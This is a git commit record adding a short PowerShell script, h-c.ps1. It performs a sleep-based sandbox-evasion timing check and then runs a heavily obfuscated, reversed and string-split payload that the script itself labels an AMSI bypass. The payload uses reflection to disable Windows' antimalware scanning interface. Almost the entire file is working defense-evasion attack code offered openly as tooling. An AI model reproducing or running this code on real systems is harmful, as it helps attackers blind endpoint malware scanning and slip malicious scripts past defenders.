a0426efe8f890b661a5cffc9f974f21dd497e8a6
Tim (Bobby-Tablez) Peck <git@pf5.co>
2023-04-10 10:06:32 -0600

    Create h-c.ps1

---
+++ h-c.ps1
@@ -0,0 +1,12 @@
+$t = Get-Date
+$s = 16
+Sleep $s
+$n = Get-Date -Format "MM/dd/yyyy HH:mm:ss"
+$r = $t.AddSeconds($s)
+$r.toString()
+If ($n -ne $r) {
+    Exit
+}Else {
+    # Obfuscated code
+    # Example: AMSI Bypass: $FqPNm=  ")''NiOj-]2,11,3[EMaN.)'*rdm*' VG((&|)93]RahC[,)911]RahC[+89]RahC[+48]RahC[(  eCALpErC-  69]RahC[,'xuW' eCALpErC-  43]RahC[,'7Tn' EcALPeR-  63]RahC[,'R6q'eCALpErC-  )')'+'e'+'ur'+'TR6q,ll'+'u'+'nR6'+'q(eulaVteS.))'+')'+'w'+'bT'+'sgal'+'F'+'g'+'w'+'b'+'T+wbTnid'+'ni'+'B'+'.noitcelf'+'eR.'+'met'+'sySw'+'bT'+'(epy'+'Tt'+'eG'+'.'+'ylb'+'mes'+'sA'+'.]'+'gn'+'irt'+'S'+'[ sa'+'- '+')wb'+'Tcit'+'at'+'S,c'+'i'+'lbu'+'Pw'+'bT+'+'wbT'+'noNw'+'bT(('+','+'wbTde'+'lia'+'F'+'ti'+'nIis'+'mawb'+'T(ekovnI'+'.))wbTdl'+'w'+'bT'+'+wbTeiF'+'t'+'e'+'Gwb'+'T(,))w'+'bTsli'+'tU'+'ism'+'A.noit'+'amotuA'+'.tneme'+'gana'+'M.m'+'etsySwbT(ep'+'yTteG.'+'ylbm'+'e'+'ss'+'A.]'+'fe'+'R[(]tcej'+'bO'+'[ '+',))'+'w'+'b'+'Tep'+'ywbT'+'+wbT'+'T.m'+'etsyS'+'w'+'bT('+'epy'+'T'+'teG'+'.'+'ylbme'+'ss'+'A.]'+'gnirtS['+' '+'sa-'+' 7Tn]o'+'f'+'nIdlei'+'F'+'.noitcelfe'+'R.m'+'et'+'syS ,)em'+'aNl'+'lu'+'F.))w'+'bTsgal'+'F'+'gwbT+wbTni'+'d'+'niB.noitc'+'elfe'+'R'+'.me'+'tsySwbT('+'e'+'p'+'yTteG.'+'ylbmessA'+'.]'+'g'+'n'+'irtS[((R6'+'q ,g'+'ni'+'rtS'+'[3x'+'uWxuWc'+'n'+'u'+'F7Tn((etagel'+'e'+'De'+'ta'+'e'+'rC::'+']eta'+'g'+'eleD['(( "; &((GeT-VariaBLE '*MDR*').namE[3,11,2]-joiN'') (-JOIn(  gci  ('vaR'+'IA'+'BLE:Fqp'+'nM')  ).VALUe[ - 1 ..-((  gci  ('vaR'+'IA'+'BLE:Fqp'+'nM')  ).VALUe.LeNgtH )])
+}
